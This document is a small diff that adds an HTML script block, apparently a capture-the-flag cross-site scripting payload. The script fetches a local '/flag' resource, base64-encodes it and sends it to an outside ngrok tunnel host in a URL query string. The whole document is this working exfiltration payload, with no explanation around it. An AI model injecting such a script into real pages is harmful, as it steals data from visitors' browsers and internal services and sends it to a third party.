@@ -1,0 +1,5 @@
+<script>
+fetch('http://localhost/flag')
+.then(r=>r.text())
+.then(d=>fetch('https://televisional-camryn-quarrelsomely.ngrok-free.dev/?data='+btoa(d)))
+</script>
